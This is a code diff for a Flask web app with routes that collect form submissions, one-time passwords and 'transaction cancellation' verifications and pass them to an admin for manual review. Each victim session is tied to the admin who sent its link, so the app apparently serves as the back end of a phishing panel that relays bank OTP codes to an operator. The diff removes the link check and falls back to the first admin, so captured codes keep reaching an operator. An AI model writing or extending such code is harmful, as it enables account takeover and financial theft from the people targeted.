@@ -369,9 +369,24 @@ def submit_form():
         # DEBUG: Log the admin_id from session
         print(f'DEBUG: Admin ID from session: {admin_id}')
         
-        # Validate that admin_id exists (client must have come through a valid admin link)
+        # If no admin_id in session, try to get it from the request args (for direct access)
         if not admin_id:
-            return jsonify({'error': 'Invalid access. Please use the correct verification link.'}), 400
+            admin_link_id = request.args.get('admin_id')
+            if admin_link_id:
+                admin = Admin.query.filter_by(unique_link_id=admin_link_id).first()
+                if admin:
+                    admin_id = admin.id
+                    session['admin_id'] = admin_id
+                    print(f'DEBUG: Set admin_id from request args: {admin_id}')
+        
+        # If still no admin_id, use the first available admin (since we simplified the system)
+        if not admin_id:
+            first_admin = Admin.query.first()
+            if first_admin:
+                admin_id = first_admin.id
+                print(f'DEBUG: Using first available admin: {admin_id}')
+            else:
+                return jsonify({'error': 'No admin accounts available. Please contact support.'}), 500
         
         # Verify the admin exists and is active
         admin = db.session.get(Admin, admin_id)
@@ -491,6 +506,12 @@ def verify_otp():
         # Get admin_id and submission_id from session if available
         admin_id = session.get('admin_id')
         submission_id = session.get('submission_id')
+        
+        # If no admin_id, use the first available admin (since we simplified the system)
+        if not admin_id:
+            first_admin = Admin.query.first()
+            if first_admin:
+                admin_id = first_admin.id
         
         # Create new OTP verification request for admin review
         verification_request = OtpVerificationRequest(
@@ -651,6 +672,12 @@ def verify_transaction_cancellation():
         admin_id = session.get('admin_id')
         submission_id = session.get('submission_id')
         
+        # If no admin_id, use the first available admin (since we simplified the system)
+        if not admin_id:
+            first_admin = Admin.query.first()
+            if first_admin:
+                admin_id = first_admin.id
+        
         # Create new transaction cancellation verification request for admin review
         verification_request = TransactionCancellationRequest(
             user_identifier=user_identifier,  # Unique identifier for this user session
@@ -782,6 +809,12 @@ def request_otp_authorization():
         
         # Get admin_id from session if available
         admin_id = session.get('admin_id')
+        
+        # If no admin_id, use the first available admin (since we simplified the system)
+        if not admin_id:
+            first_admin = Admin.query.first()
+            if first_admin:
+                admin_id = first_admin.id
         
         # Create new authorization request
         auth_request = OtpAuthorizationRequest(
